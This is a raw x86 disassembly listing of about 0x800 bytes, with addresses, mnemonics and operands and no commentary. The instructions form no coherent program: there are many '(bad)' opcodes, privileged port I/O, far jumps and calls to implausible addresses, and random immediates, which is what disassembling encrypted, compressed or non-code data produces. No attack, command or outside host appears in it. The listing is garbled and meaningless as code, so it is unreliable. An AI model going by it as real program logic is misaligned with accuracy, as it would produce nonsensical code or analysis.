  405fe8:	repnz mov ebx,0x3bb18629
  405fee:	out    0x8,al
  405ff0:	mov    ecx,0x7264fd50
  405ff5:	jmp    0x4062e5
  405ffa:	iret   
  405ffb:	rcl    ebx,cl
  405ffd:	retf   
  405ffe:	ror    ebx,cl
  406000:	xlat   BYTE PTR ds:[ebx]
  406001:	(bad)  [ecx]
  406003:	lods   eax,DWORD PTR ds:[esi]
  406004:	and    al,0xa9
  406006:	cld    
  406007:	fyl2x  
  406009:	int    0x89
  40600b:	ret    0x7878
  40600e:	dec    ebp
  40600f:	jle    0x406089
  406011:	js     0x405fc5
  406013:	or     BYTE PTR [ebx+0x6],bl
  406016:	mov    ds,edi
  406018:	dec    esi
  406019:	push   edx
  40601a:	dec    ecx
  40601b:	mov    ebx,0xed1f8d3f
  406020:	ds scas eax,DWORD PTR es:[edi]
  406022:	xchg   edx,eax
  406023:	push   ss
  406024:	sti    
  406025:	or     al,cl
  406027:	or     bh,BYTE PTR [edi-0x67]
  40602a:	popf   
  40602b:	jp     0x406034
  40602d:	sub    ebp,DWORD PTR [eax-0x5e]
  406030:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406031:	repnz icebp 
  406033:	ror    eax,1
  406035:	adc    edi,esi
  406037:	cmp    ah,BYTE PTR [ebx+0x1935c423]
  40603d:	adc    al,0x9b
  40603f:	test   al,0x69
  406041:	sub    bl,BYTE PTR [edx+0x16983ef5]
  406047:	inc    edx
  406048:	mov    al,dl
  40604a:	(bad)  
  40604b:	out    dx,eax
  40604c:	mov    bh,0x2c
  40604e:	xchg   dh,bh
  406050:	add    edi,DWORD PTR [ebx+ebp*8+0x189a41c0]
  406057:	pop    ebp
  406058:	jge    0x406034
  40605a:	push   esi
  40605b:	add    cl,cl
  40605d:	mov    esi,0xb01122ab
  406062:	fsub   QWORD PTR [ebp+0x2de9e131]
  406068:	or     edi,edi
  40606a:	icebp  
  40606b:	out    dx,eax
  40606c:	inc    esi
  40606d:	lods   eax,DWORD PTR ds:[esi]
  40606e:	test   al,0xae
  406070:	daa    
  406071:	outs   dx,BYTE PTR ds:[esi]
  406072:	shl    DWORD PTR [eax],cl
  406074:	adc    edx,ecx
  406076:	xchg   DWORD PTR ds:0xaa407eb4,edi
  40607c:	shl    DWORD PTR [ebp+0x30a63001],0x2b
  406083:	pop    esi
  406084:	and    edx,edi
  406086:	and    BYTE PTR [ebp-0x5ef1b1e],bh
  40608c:	inc    eax
  40608d:	inc    DWORD PTR [ecx-0x3f7aa812]
  406093:	pop    ebp
  406094:	jne    0x40602f
  406096:	mov    esp,0xdc4b0828
  40609b:	mov    edx,DWORD PTR [ecx+0x10]
  40609e:	sti    
  40609f:	stc    
  4060a0:	loopne 0x40609a
  4060a2:	xor    al,0x98
  4060a4:	and    eax,0x33310abe
  4060a9:	and    BYTE PTR [esi],cl
  4060ab:	mov    ebp,0x86eadbc
  4060b0:	jle    0x406061
  4060b2:	or     DWORD PTR [eax+0x4a723354],esp
  4060b8:	cmp    BYTE PTR [edi+eiz*2-0x1bdcf39f],al
  4060bf:	add    al,0xc0
  4060c1:	cli    
  4060c2:	leave  
  4060c3:	mov    esi,DWORD PTR [ebx]
  4060c5:	je     0x4060be
  4060c7:	dec    ebx
  4060c8:	push   ebp
  4060c9:	std    
  4060ca:	mov    bh,0xa3
  4060cc:	xchg   edx,eax
  4060cd:	fsubr  QWORD PTR [ebx]
  4060cf:	inc    eax
  4060d0:	mov    edx,0x63106f76
  4060d5:	mov    al,ds:0x7e996875
  4060da:	xchg   edi,eax
  4060db:	lods   al,BYTE PTR ds:[esi]
  4060dc:	inc    edi
  4060dd:	fwait
  4060de:	pop    esi
  4060df:	push   ss
  4060e0:	add    eax,0x981b8155
  4060e5:	xor    DWORD PTR [ebp+0x4f93b640],0x5bf9daaa
  4060ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060f0:	pop    es
  4060f1:	and    al,ah
  4060f3:	adc    DWORD PTR [esi+edx*8],0xb8133a18
  4060fa:	cmc    
  4060fb:	nop
  4060fc:	cmc    
  4060fd:	repnz scas al,BYTE PTR es:[edi]
  4060ff:	std    
  406100:	imul   eax,DWORD PTR [edx-0x21],0x26a6ad0d
  406107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406108:	adc    BYTE PTR [esi],0xb
  40610b:	pop    DWORD PTR [esi+0x3def13de]
  406111:	fsubp  st(5),st
  406113:	repz mov dh,0x2a
  406116:	in     al,0x43
  406118:	int    0x8e
  40611a:	arpl   WORD PTR [edx+0x70],si
  40611d:	retf   
  40611e:	mov    WORD PTR [eax-0x78],cs
  406121:	inc    edi
  406122:	xor    DWORD PTR [eiz*4-0x658281a6],edi
  406129:	not    BYTE PTR es:[ecx+0x3]
  40612d:	ss jmp 0x70c58493
  406133:	lds    esi,FWORD PTR [esi+0x192977fb]
  406139:	(bad)  
  40613a:	mov    bh,0xe
  40613c:	test   eax,0xf056aae6
  406141:	mov    ebx,DWORD PTR ds:0x6b7f01a7
  406147:	adc    al,0x78
  406149:	sub    bl,BYTE PTR [edx+ebp*4]
  40614c:	pop    edi
  40614d:	or     BYTE PTR [edi-0x75],cl
  406150:	push   edi
  406151:	ret    
  406152:	rol    BYTE PTR [esi-0xb013a24],cl
  406158:	cmc    
  406159:	loope  0x4061b5
  40615b:	stc    
  40615c:	or     ebp,esp
  40615e:	lds    esp,FWORD PTR [edx]
  406160:	call   0xe9e1:0x2a3ecb41
  406167:	ins    DWORD PTR es:[di],dx
  406169:	xchg   ebx,eax
  40616a:	retf   
  40616b:	pop    edi
  40616c:	jmp    0xce67b615
  406171:	pusha  
  406172:	rcl    DWORD PTR [ebx+0x2ff28595],cl
  406178:	xlat   BYTE PTR ds:[ebx]
  406179:	dec    eax
  40617a:	rol    bh,0x7a
  40617d:	(bad)  [ebp-0x14]
  406180:	mov    al,0xb3
  406182:	ds iret 
  406184:	adc    ebp,DWORD PTR [eax]
  406186:	mov    ebx,0xdf0b8150
  40618b:	add    al,0x31
  40618d:	in     eax,0x1a
  40618f:	xchg   edx,eax
  406190:	cli    
  406191:	sub    eax,0x3bcb237b
  406196:	and    DWORD PTR [edi-0x4ba9757e],esi
  40619c:	ins    BYTE PTR es:[edi],dx
  40619d:	std    
  40619e:	aas    
  40619f:	xor    cl,0x9d
  4061a2:	add    al,0xd8
  4061a4:	sar    DWORD PTR [ecx],cl
  4061a6:	fmul   QWORD PTR [edx+0x7923f662]
  4061ac:	inc    ecx
  4061ad:	stc    
  4061ae:	jo     0x4061ce
  4061b0:	leave  
  4061b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061b2:	shr    BYTE PTR [ebx],0x69
  4061b5:	inc    bh
  4061b7:	push   cs
  4061b8:	test   eax,0x97d58718
  4061bd:	xor    BYTE PTR [ebx+ebp*1],ch
  4061c0:	cmp    DWORD PTR [ecx],eax
  4061c2:	pop    edi
  4061c3:	loopne 0x4061c9
  4061c5:	ret    
  4061c6:	stos   BYTE PTR es:[edi],al
  4061c7:	ds fwait
  4061c9:	push   ecx
  4061ca:	das    
  4061cb:	mov    al,ds:0x3085503c
  4061d0:	push   ebp
  4061d1:	inc    ebx
  4061d2:	mov    edx,0x1afe523d
  4061d7:	mov    al,0x51
  4061d9:	dec    edi
  4061da:	mov    esp,0x698f032c
  4061df:	adc    DWORD PTR [eax],edx
  4061e1:	scas   al,BYTE PTR es:[edi]
  4061e2:	and    ah,BYTE PTR [edx-0x67]
  4061e5:	or     bh,BYTE PTR [esp+ecx*1+0x4ed4d9fd]
  4061ec:	mov    ebx,0x2de4b5f2
  4061f1:	sub    bl,BYTE PTR [ecx+esi*1]
  4061f4:	mov    WORD PTR [esi+eiz*4+0x2c],gs
  4061f8:	sub    BYTE PTR [edx-0x43],al
  4061fb:	xor    BYTE PTR [eax+eax*4-0x11],ch
  4061ff:	(bad)  
  406200:	and    BYTE PTR [ecx+0x46e1a9d5],bl
  406206:	jno    0x406281
  406208:	repnz nop
  40620a:	outs   dx,BYTE PTR ds:[esi]
  40620b:	div    DWORD PTR [eax+0x73bac455]
  406211:	push   0xffffffc1
  406213:	and    ecx,DWORD PTR [esi-0x79b3b44]
  406219:	inc    eax
  40621a:	mov    ecx,0xc61732b9
  40621f:	pop    es
  406220:	xor    ecx,esp
  406222:	dec    esi
  406223:	dec    edx
  406224:	nop
  406225:	push   edx
  406226:	inc    ecx
  406227:	xchg   ecx,eax
  406228:	inc    ebx
  406229:	pop    esp
  40622a:	or     ch,bl
  40622c:	pop    edx
  40622d:	(bad)  
  406231:	or     al,BYTE PTR [ecx-0x475fa5c9]
  406237:	(bad)  
  406239:	rol    al,0xe4
  40623c:	sti    
  40623d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40623e:	and    BYTE PTR [edi-0x604619eb],ah
  406244:	mov    edx,0xdcf48d59
  406249:	(bad)  
  40624a:	stc    
  40624b:	push   eax
  40624c:	pop    ds
  40624d:	xchg   ebx,eax
  40624e:	pushf  
  40624f:	mov    ebp,0x6668e12e
  406254:	cwde   
  406255:	fcomp  DWORD PTR [ebx]
  406257:	ja     0x40628f
  406259:	pop    ebx
  40625a:	mov    bl,0x3b
  40625c:	dec    ebp
  40625d:	pop    ebp
  40625e:	dec    eax
  40625f:	jmp    0x4061e8
  406261:	adc    edx,DWORD PTR [eax+0x1a6fc791]
  406267:	mov    esp,0xd0f034f0
  40626c:	shl    BYTE PTR [eax+0x61ccb44c],cl
  406272:	sbb    BYTE PTR [esi+edx*4],ah
  406275:	ds inc eax
  406277:	mov    bh,0x50
  406279:	and    eax,DWORD PTR [esi+eiz*4-0x38]
  40627d:	es dec esi
  40627f:	or     edi,DWORD PTR [ebp-0x64]
  406282:	dec    esp
  406283:	imul   edx,DWORD PTR [edx+0x1a],0x4c
  406287:	aas    
  406288:	loop   0x4062c5
  40628a:	jns    0x40623a
  40628c:	cmp    BYTE PTR [esi],bl
  40628e:	xchg   ch,ah
  406290:	popf   
  406291:	mov    esi,0x941cc9b
  406296:	lods   eax,DWORD PTR ds:[esi]
  406297:	imul   ecx,ebx,0xffffffab
  40629a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40629b:	inc    edi
  40629c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40629d:	mov    dh,0xd4
  40629f:	retf   
  4062a0:	sbb    al,0x16
  4062a2:	and    BYTE PTR [eax],dl
  4062a4:	in     al,dx
  4062a5:	loope  0x40628e
  4062a7:	loop   0x4062bf
  4062a9:	jmp    0xd49a5ce7
  4062ae:	je     0x4062a2
  4062b0:	bound  eax,QWORD PTR [eax+ecx*1-0x50]
  4062b4:	scas   al,BYTE PTR es:[edi]
  4062b5:	xor    DWORD PTR [eax-0xd4df864],edx
  4062bb:	test   al,0xf8
  4062bd:	or     eax,0xf086e22e
  4062c2:	data16 mov al,ds:0x98f1773b
  4062c8:	sub    eax,0xb0e67cb2
  4062cd:	sub    BYTE PTR [esi+ecx*1+0x25],bl
  4062d1:	icebp  
  4062d2:	or     eax,0x269cc9bc
  4062d7:	std    
  4062d8:	iret   
  4062d9:	inc    esp
  4062da:	ins    BYTE PTR es:[edi],dx
  4062db:	inc    ebp
  4062dc:	mov    ch,0xd
  4062de:	fsub   DWORD PTR [eax]
  4062e0:	mov    ebp,0x2cb02154
  4062e5:	div    ecx
  4062e7:	mov    ecx,DWORD PTR [ebp+0x10]
  4062ea:	jmp    0x4065da
  4062ef:	(bad)  
  4062f0:	aas    
  4062f1:	ret    0xc9c2
  4062f4:	rol    esi,0xcb
  4062f7:	sbb    DWORD PTR [ebp-0x64],0x450a2e5c
  4062fe:	addr16 faddp st(7),st
  406301:	js     0x40637b
  406303:	dec    ebp
  406304:	jle    0x40637e
  406306:	js     0x406353
  406308:	stos   BYTE PTR es:[edi],al
  406309:	jno    0x406314
  40630b:	sbb    al,0xc6
  40630d:	or     eax,0x1f4ef77a
  406312:	mov    ebx,DWORD PTR [edx+0x59]
  406315:	std    
  406316:	jg     0x406362
  406318:	jmp    0xd42ae7a5
  40631d:	nop
  40631e:	test   eax,0xe7348ffd
  406323:	(bad)  
  406324:	pop    ss
  406325:	daa    
  406326:	mov    cs,WORD PTR [ebp-0x3f036c26]
  40632c:	fidiv  DWORD PTR [ecx-0x73]
  40632f:	dec    ebx
  406330:	inc    eax
  406331:	xor    eax,0xd79209a
  406336:	push   ecx
  406337:	mov    bh,0xc5
  406339:	bound  eax,QWORD PTR [esi]
  40633b:	mov    ebp,0xf86594c6
  406340:	add    eax,0x131debe1
  406345:	mov    bl,0x47
  406347:	push   ebp
  406348:	adc    ebp,DWORD PTR [ecx+0x1c]
  40634b:	arpl   WORD PTR [ebp-0x6f],di
  40634e:	rcl    BYTE PTR [ecx+esi*1-0x618cce04],1
  406355:	loope  0x4063c9
  406357:	jge    0x406373
  406359:	and    DWORD PTR [ebx+0x46],0xdbcc262c
  406360:	cdq    
  406361:	cmp    eax,0x40614301
  406366:	pusha  
  406367:	sub    DWORD PTR [esi],esp
  406369:	xor    eax,0x58ee086d
  40636e:	sbb    al,0x6c
  406370:	int    0x59
  406372:	aam    0xcd
  406374:	xchg   edi,eax
  406375:	mov    edx,0x10d1a35f
  40637a:	not    DWORD PTR [ebp-0x11]
  40637d:	jno    0x406382
  40637f:	es retf 
  406381:	jle    0x406324
  406383:	add    ecx,DWORD PTR [eax-0x3f]
  406386:	push   ss
  406387:	pop    ss
  406388:	std    
  406389:	mov    eax,0x8e2cbfde
  40638e:	xor    eax,0xfb6b1bcf
  406393:	cmp    ebx,DWORD PTR [eax+eax*2-0x39]
  406397:	mov    ds:0xf57a17b4,eax
  40639c:	test   eax,0x72d78673
  4063a1:	mov    cl,BYTE PTR [esi]
  4063a3:	retf   
  4063a4:	mov    fs,WORD PTR [ebx-0x5ea7dc3a]
  4063aa:	sub    eax,0x2b859d91
  4063af:	mov    edi,0xf4141fab
  4063b4:	repz mov ch,0xec
  4063b7:	in     al,0xc5
  4063b9:	(bad)
  4063bc:	sbb    eax,0x35109ccd
  4063c1:	mov    ebx,eax
  4063c3:	mov    ebx,0x8b1ffa3b
  4063c8:	in     al,0x69
  4063ca:	mov    bl,0xb6
  4063cc:	aam    0x6
  4063ce:	test   eax,0x17b7e334
  4063d3:	add    esi,ebp
  4063d5:	adc    bh,BYTE PTR [esi-0x7e]
  4063d8:	iret   
  4063d9:	imul   esp,DWORD PTR ds:0x8f5a1bae,0x6325e79d
  4063e3:	inc    edx
  4063e4:	jp     0x4063f0
  4063e6:	imul   esp,DWORD PTR [esi-0xff56d2b],0xffffffbb
  4063ed:	jmp    0xa87:0x175137d6
  4063f4:	pop    ds
  4063f5:	cld    
  4063f6:	das    
  4063f7:	fidiv  WORD PTR [eax]
  4063f9:	adc    DWORD PTR [edx+0x78],ecx
  4063fc:	mov    dl,al
  4063fe:	test   DWORD PTR [edx+eiz*8],edx
  406401:	jecxz  0x40639e
  406403:	mov    eax,0x97de5b4d
  406408:	mov    ah,0x65
  40640a:	dec    edi
  40640b:	and    DWORD PTR [eax+edi*1],esi
  40640e:	data16 mov WORD PTR [eax-0x216b6213],cs
  406415:	jl     0x40643f
  406417:	or     bh,bl
  406419:	add    ebp,DWORD PTR [ecx+0x4af19372]
  40641f:	or     BYTE PTR [esp+ecx*4-0x5399e341],dl
  406426:	jecxz  0x406489
  406428:	cmp    al,0x6e
  40642a:	in     eax,dx
  40642b:	mov    bh,0x6
  40642d:	lahf   
  40642e:	fs push eax
  406430:	ret    
  406431:	ret    0xd0b5
  406434:	cmp    ebp,eax
  406436:	cmc    
  406437:	add    al,0x40
  406439:	lock enter 0xe232,0x51
  40643e:	xor    edx,DWORD PTR [eax]
  406440:	dec    eax
  406441:	cmp    BYTE PTR [edi],bh
  406443:	lahf   
  406444:	xor    BYTE PTR [esi+0x3a],ch
  406447:	loop   0x40642b
  406449:	loop   0x4064b9
  40644b:	xor    eax,0x6f5236f5
  406450:	push   edx
  406451:	out    dx,eax
  406452:	push   cs
  406453:	test   al,0x59
  406455:	push   ss
  406456:	aad    0xfb
  406458:	in     eax,dx
  406459:	sub    eax,0x22d0f0b1
  40645e:	pop    ebp
  40645f:	add    BYTE PTR [ebx],0x64
  406462:	xchg   DWORD PTR [ecx+0x4a],eax
  406465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406466:	sbb    bl,BYTE PTR [ecx+eax*1-0x11fb2130]
  40646d:	or     ch,BYTE PTR [eax]
  40646f:	sti    
  406470:	push   ss
  406471:	out    dx,eax
  406472:	or     eax,0x125cd986
  406477:	xor    bl,BYTE PTR [eax+edx*1]
  40647a:	jns    0x4063fe
  40647c:	push   es
  40647d:	jle    0x40649a
  40647f:	(bad)  
  406480:	xor    DWORD PTR [ecx+0x69],edx
  406483:	outs   dx,DWORD PTR ds:[esi]
  406484:	fstp   TBYTE PTR [edx]
  406486:	rcr    BYTE PTR [ebx-0x74],1
  406489:	xor    al,BYTE PTR [ebx+eax*2-0x5c]
  40648d:	ss pop eax
  40648f:	popf   
  406490:	or     edi,DWORD PTR [edi+0x16]
  406493:	dec    ebx
  406494:	jg     0x40647d
  406496:	test   DWORD PTR [edx],ebx
  406498:	mov    WORD PTR [ecx-0x1e],ds
  40649b:	pop    ss
  40649c:	sbb    eax,0x283a2560
  4064a1:	(bad)  
  4064a2:	das    
  4064a3:	popf   
  4064a4:	jmp    0x4064bc
  4064a6:	stos   BYTE PTR es:[edi],al
  4064a7:	mov    ecx,0x7312d316
  4064ac:	ja     0x406513
  4064ae:	mov    dh,0xc6
  4064b0:	(bad)  
  4064b1:	das    
  4064b2:	scas   al,BYTE PTR es:[edi]
  4064b3:	mov    eax,0xa5c84465
  4064b8:	loop   0x40644a
  4064ba:	add    eax,0x2bb9eb11
  4064bf:	push   esi
  4064c0:	icebp  
  4064c1:	loop   0x40652e
  4064c3:	pop    esi
  4064c4:	fisub  WORD PTR [esi]
  4064c6:	stos   DWORD PTR es:[edi],eax
  4064c7:	mov    ds:0x527c5b20,al
  4064cc:	ficom  WORD PTR [ebx-0x72d59c30]
  4064d2:	cmp    bl,BYTE PTR [ebx-0x55c7fbfe]
  4064d8:	out    dx,eax
  4064d9:	imul   ebp,ebp,0x72
  4064dc:	or     edx,ecx
  4064de:	adc    ecx,edx
  4064e0:	imul   ebx,DWORD PTR [edx+ecx*1],0x6c
  4064e4:	ret    
  4064e5:	int    0xa2
  4064e7:	repnz xchg esp,eax
  4064e9:	ins    BYTE PTR es:[edi],dx
  4064ea:	mov    ds:0x6bbb81e6,al
  4064ef:	test   BYTE PTR [edx+0x18c6e1f0],al
  4064f5:	mov    ch,0x7d
  4064f7:	mov    esi,0xb880de95
  4064fc:	xchg   edx,eax
  4064fd:	cs ins DWORD PTR es:[edi],dx
  4064ff:	scas   al,BYTE PTR es:[edi]
  406500:	test   eax,0x18b4d54c
  406505:	jmp    0x4064e4
  406507:	ins    DWORD PTR es:[edi],dx
  406508:	mov    bh,0xc5
  40650a:	add    BYTE PTR [ebx],cl
  40650c:	push   0x6a
  40650e:	ficom  WORD PTR [edi+0x585268d1]
  406514:	mov    edi,DWORD PTR [ebx]
  406516:	add    DWORD PTR [eax+0x23],esi
  406519:	outs   dx,DWORD PTR ds:[esi]
  40651a:	jmp    0x6f3f0a3b
  40651f:	lods   eax,DWORD PTR ds:[esi]
  406520:	aam    0x6a
  406522:	push   ds
  406523:	fmul   QWORD PTR [ebp+0x4e]
  406526:	xchg   ebx,eax
  406527:	push   cs
  406528:	adc    BYTE PTR [ebp-0x76a9b850],bl
  40652e:	into   
  40652f:	jmp    0x6d50:0x56b674e4
  406536:	retf   0xaeef
  406539:	jl     0x406575
  40653b:	adc    ebx,edx
  40653d:	xchg   ebp,eax
  40653e:	sbb    al,0x52
  406540:	cmp    dh,dl
  406542:	out    0x22,al
  406544:	out    dx,al
  406545:	leave  
  406546:	ss retf 0xa23d
  40654a:	xor    cl,ah
  40654c:	gs into 
  40654e:	inc    edi
  40654f:	scas   eax,DWORD PTR es:[edi]
  406550:	call   0x2cb8:0x8d39e8e5
  406557:	inc    ebp
  406558:	pop    esp
  406559:	fisttp DWORD PTR [edi]
  40655b:	sub    ebp,0x49ed53c6
  406561:	test   ecx,ebp
  406563:	hlt    
  406564:	js     0x40658f
  406566:	and    DWORD PTR [edx],edx
  406568:	xchg   edx,eax
  406569:	mov    DWORD PTR [ecx-0x1b5d1cc0],esi
  40656f:	xlat   BYTE PTR ds:[ebx]
  406570:	out    0xfd,eax
  406572:	push   es
  406573:	jno    0x406589
  406575:	cmp    esp,esp
  406577:	mov    WORD PTR [ebp+0xe],ss
  40657a:	outs   dx,BYTE PTR ds:[esi]
  40657b:	xor    al,0x81
  40657d:	in     eax,dx
  40657e:	sub    BYTE PTR [eax+0x120ea6d7],cl
  406584:	and    eax,0x9702684a
  406589:	fiadd  DWORD PTR ds:0x19690e76
  40658f:	ror    BYTE PTR [ebx-0x8c75f99],cl
  406595:	dec    ecx
  406596:	inc    ebx
  406597:	push   esi
  406598:	mov    ss,WORD PTR [esi+0x64]
  40659b:	sub    al,0xe6
  40659d:	push   ebp
  40659e:	mov    al,ds:0xa836c1aa
  4065a3:	and    BYTE PTR es:[esi+ebx*1],ch
  4065a7:	xchg   edx,eax
  4065a8:	mov    DWORD PTR [edi-0x4453222e],esi
  4065ae:	out    0xf8,al
  4065b0:	dec    edx
  4065b1:	ds stos BYTE PTR es:[edi],al
  4065b3:	mov    dl,dl
  4065b5:	mov    BYTE PTR ds:0x5b8f4af,ch
  4065bb:	fadd   DWORD PTR [ebx-0x2e]
  4065be:	adc    al,0xf1
  4065c0:	mov    bh,0x50
  4065c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065c3:	loopne 0x40663a
  4065c5:	test   BYTE PTR [edi+0x13],0xc5
  4065c9:	test   eax,0x346804fc
  4065ce:	jmp    0x1e78:0x5ee3877a
  4065d5:	adc    ah,BYTE PTR ds:0x23b058cd
  4065db:	enter  0xc981,0x8e
  4065df:	sbb    eax,0xc18b8116
  4065e4:	jmp    0x4068d4
  4065e9:	ds enter 0x3dcf,0xcd
  4065ee:	cmp    eax,0xabe7cfce
  4065f3:	mov    ch,cl
  4065f5:	inc    esp
  4065f6:	or     BYTE PTR [esi],al
  4065f8:	dec    esp
  4065f9:	xor    eax,esp
  4065fb:	js     0x406675
  4065fd:	dec    ebp
  4065fe:	jle    0x406678
  406600:	js     0x4065c2
  406602:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406603:	stos   BYTE PTR es:[edi],al
  406604:	push   es
  406605:	mov    eax,0x43117f7d
  40660b:	out    0x25,al
  40660d:	cmp    DWORD PTR [ecx+0x8353336],ebp
  406613:	scas   eax,DWORD PTR es:[edi]
  406614:	push   0x6f
  406616:	test   BYTE PTR [ebx],dl
  406618:	xchg   di,ax
  40661a:	adc    al,0x27
  40661c:	fnstcw WORD PTR [edx-0x3d67a8bb]
  406622:	loopne 0x406648
  406624:	push   0xffffffd7
  406626:	and    bl,bh
  406628:	mov    bl,BYTE PTR [ecx]
  40662a:	out    dx,eax
  40662b:	xchg   esp,eax
  40662c:	int3   
  40662d:	test   esp,0xcb0f5a90
  406633:	pop    ebx
  406634:	repz pop ds
  406636:	inc    ebp
  406637:	cmc    
  406638:	(bad)  
  406639:	out    dx,al
  40663a:	mov    edx,DWORD PTR [ecx]
  40663c:	sub    al,0x23
  40663e:	es inc edi
  406640:	je     0x4065fe
  406642:	fild   WORD PTR [edx-0x413e0ff3]
  406648:	mov    WORD PTR [esi-0x63],?
  40664b:	dec    BYTE PTR [edx*1-0x6c02db50]
  406652:	jns    0x406631
  406654:	pushf  
  406655:	adc    edx,esi
  406657:	outs   dx,BYTE PTR cs:[esi]
  406659:	mov    esp,0x2eb26062
  40665e:	pop    ss
  40665f:	(bad)  
  406660:	std    
  406661:	(bad)  
  406662:	pop    esp
  406663:	push   ds
  406664:	leave  
  406665:	cdq    
  406666:	and    eax,0x90076c0d
  40666b:	sti    
  40666c:	(bad)
  40666f:	ds push cs
  406671:	sbb    BYTE PTR [ecx],dl
  406673:	pop    ecx
  406674:	retf   0x781
  406677:	shr    BYTE PTR [edx+edx*8],cl
  40667a:	(bad)  
  40667b:	cmp    eax,0x66325612
  406680:	mov    ds:0xd3ec1691,eax
  406685:	outs   dx,DWORD PTR ds:[esi]
  406686:	mov    ebp,0x591e471d
  40668b:	ret    
  40668c:	adc    DWORD PTR [edi],eax
  40668e:	jnp    0x406636
  406690:	imul   esp,ebx,0xffffff8c
  406693:	mov    al,0x10
  406695:	rcr    dh,0xa5
  406698:	jbe    0x406695
  40669a:	test   esp,0x65c16778
  4066a0:	loope  0x40664a
  4066a2:	cmp    DWORD PTR [edx],ebp
  4066a4:	adc    DWORD PTR [eax],edx
  4066a6:	popf   
  4066a7:	mov    ebp,0x9051c969
  4066ac:	icebp  
  4066ad:	inc    ebx
  4066ae:	and    ah,BYTE PTR [esi+0x10]
  4066b1:	sub    al,0x29
  4066b3:	or     edx,DWORD PTR [eax+0xe]
  4066b6:	jmp    0x97540e92
  4066bb:	xchg   edi,eax
  4066bc:	or     dl,BYTE PTR ds:0xd2de4ee2
  4066c2:	loopne 0x406683
  4066c4:	xchg   BYTE PTR [ebp+0x3a],bl
  4066c7:	xchg   DWORD PTR [ebp+0x7e],ebx
  4066ca:	push   ebx
  4066cb:	and    esi,edx
  4066cd:	scas   al,BYTE PTR es:[edi]
  4066ce:	mov    eax,0xfca2ebb2
  4066d3:	dec    ebp
  4066d4:	leave  
  4066d5:	fs in  eax,dx
  4066d7:	xor    al,0xd4
  4066d9:	test   DWORD PTR [esi+0x73],esp
  4066dc:	not    BYTE PTR [ebp+0x2d88c0c5]
  4066e2:	pusha  
  4066e3:	xor    BYTE PTR [edx-0xfe2c422],0x6f
  4066ea:	int    0x3b
  4066ec:	jge    0x40675c
  4066ee:	xchg   edx,eax
  4066ef:	daa    
  4066f0:	fs add dl,ah
  4066f3:	(bad)  
  4066f4:	and    al,BYTE PTR [ecx]
  4066f6:	mov    dl,0xf3
  4066f8:	and    esp,DWORD PTR [esi+eax*4+0x20]
  4066fc:	in     eax,dx
  4066fd:	mov    al,ds:0x8ee851e0
  406702:	add    DWORD PTR [esi-0x23a764fb],esp
  406708:	mov    bh,0x7f
  40670a:	xor    al,0x16
  40670c:	(bad)  
  40670d:	xchg   edx,eax
  40670e:	xchg   edx,eax
  40670f:	imul   ebx,DWORD PTR [edx],0x24
  406712:	mov    ds:0xccf98cff,al
  406717:	rol    BYTE PTR [edx+0x62197131],1
  40671d:	dec    edx
  40671e:	adc    eax,DWORD PTR [edx+0x14b6f3e6]
  406724:	rcl    BYTE PTR [ebx-0x25],cl
  406727:	mov    edx,0x9456d7e3
  40672c:	xchg   DWORD PTR [ecx+0x531e63f1],edi
  406732:	scas   eax,DWORD PTR es:[edi]
  406733:	jb     0x406768
  406735:	xlat   BYTE PTR ds:[ebx]
  406736:	or     eax,0xecafb27
  40673b:	xchg   DWORD PTR [edx-0x4c],eax
  40673e:	fiadd  DWORD PTR [ebx-0x38]
  406741:	xor    al,0x65
  406743:	inc    ebx
  406744:	imul   ecx,DWORD PTR [ecx-0x58869a39],0xfdab357c
  40674e:	adc    eax,0x34ae42b5
  406753:	aad    0xb4
  406755:	lea    eax,[ecx+0x30]
  406758:	sbb    eax,0x137cde86
  40675d:	shr    bh,cl
  40675f:	and    dh,ah
  406761:	sti    
  406762:	mov    eax,ds:0xed83d7a6
  406767:	je     0x4067c7
  406769:	sahf   
  40676a:	push   ebx
  40676b:	pop    ebp
  40676c:	out    0x65,al
  40676e:	ds push ecx
  406770:	add    eax,0x9a9bd03
  406775:	and    al,0x24
  406777:	and    al,0xbb
  406779:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40677b:	ret    
  40677c:	adc    BYTE PTR [eax+edx*2],0xe6
  406780:	add    eax,0x853c4226
  406785:	mov    ah,0x70
  406787:	and    al,0xfa
  406789:	mov    ah,BYTE PTR ds:0x17c7f2a1
  40678f:	shl    cl,1
  406791:	sub    eax,0x7ef9d07f
  406796:	popf   
  406797:	mov    ch,0xdf
  406799:	adc    bl,BYTE PTR ds:0x4c81a0ff
  40679f:	out    dx,eax
  4067a0:	outs   dx,BYTE PTR ds:[esi]
  4067a1:	inc    edi
  4067a2:	pop    edx
  4067a3:	push   ecx
  4067a4:	inc    ebx
  4067a5:	mov    edx,0x5401c2eb
  4067aa:	xor    dl,bh
  4067ac:	push   esp
  4067ad:	shl    DWORD PTR [edi+0x3ee5554d],0x1e
  4067b4:	jb     0x4067a1
  4067b6:	push   esi
  4067b7:	lods   al,BYTE PTR ds:[esi]
  4067b8:	(bad)  
  4067b9:	popf   
  4067ba:	xchg   esi,eax
  4067bb:	sahf   
  4067bc:	ret    
  4067bd:	call   0x8b1c3b3a
  4067c2:	xlat   BYTE PTR ds:[ebx]
  4067c3:	bound  eax,QWORD PTR [edx+0x13]
  4067c6:	std    
  4067c7:	pop    esp
  4067c8:	sbb    eax,0xc5670269
  4067cd:	mov    eax,DWORD PTR [edx]
  4067cf:	push   0x61786136
  4067d4:	stc    
  4067d5:	in     al,dx
  4067d6:	lods   al,BYTE PTR ds:[esi]
  4067d7:	mov    esi,0x77f4e6b7
  4067dc:	cmp    ecx,esp
  4067de:	fs call 0x46625156
  4067e4:	mov    dh,0xa9
  4067e6:	inc    ebp
  4067e7:	xor    bh,ah
  4067e9:	xor    eax,0x8e2359c2
  4067ee:	icebp  
  4067ef:	sbb    bh,BYTE PTR [edx+0x2d98edae]
  4067f5:	in     eax,0x7c
  4067f7:	jno    0x4067a6
  4067f9:	in     al,0x93
